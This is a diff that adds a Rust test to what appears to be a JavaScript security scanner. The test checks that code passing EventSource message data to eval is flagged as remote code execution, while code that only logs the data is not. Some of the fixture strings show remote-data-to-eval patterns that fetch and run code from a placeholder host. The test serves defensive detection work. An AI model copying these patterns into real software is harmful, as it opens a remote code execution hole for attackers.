@@ -1506,6 +1506,44 @@ fn websocket_message_callback_reaches_dynamic_execution() {
 }
 
 #[test]
+fn event_source_messages_are_remote_but_listening_is_not_execution() {
+    let root = temporary_directory("event-source-message");
+    fs::write(
+        root.join("positive.js"),
+        b"const events = new EventSource('https://example.invalid/events'); events.addEventListener('message', event => eval(event.data));",
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        b"const events = new EventSource('https://example.invalid/events'); events.addEventListener('message', event => console.log(event.data));",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let executions = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect::<Vec<_>>();
+    assert_eq!(executions.len(), 1, "{}", report["findings"]);
+    assert!(
+        executions[0]["file"]
+            .as_str()
+            .unwrap()
+            .contains("positive.js")
+    );
+    assert!(
+        executions[0]["evidence"]
+            .to_string()
+            .contains("EventSource.data")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn node_https_data_callback_reaches_dynamic_execution() {
     let root = temporary_directory("https-response");
     fs::write(root.join("main.js"), b"const https = require('https'); https.get('https://example.invalid/control', response => { response.on('data', chunk => eval(chunk.toString())); });").unwrap();
